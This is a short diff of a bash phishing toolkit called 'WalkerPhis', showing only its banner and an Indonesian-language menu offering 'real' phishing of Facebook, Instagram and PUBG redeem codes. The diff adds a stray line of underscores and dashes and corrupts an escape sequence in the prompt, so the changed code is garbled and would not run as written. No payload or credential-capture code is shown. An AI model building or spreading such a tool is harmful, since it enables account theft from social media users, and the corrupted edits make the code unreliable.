@@ -9,6 +9,7 @@ printf "\e[5;34m.....................WalkerPhis....................
 \e[5;34m...................................................
             \e[7;32mcopyright ©2019 | 2-07-2019
 \e[5;31m===================================================" 
+
 printf "
 [1] Pishing Facebook Real
 [2] Pishing Instagram Real
@@ -17,7 +18,8 @@ printf "
 [5] Pishing Pubg Kode Redeem
 [6] Subscribe my Channel
 [0] Keluar\n\n" | lolcat
-printf "[?] \e[5;32mPilih Nomor :\e[0m "
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+printf "[?] \e[5;32mPilih Nomor :\e[Kak "
 read select
 if [ $select = 1 ] || [ $select = 01 ]
 then
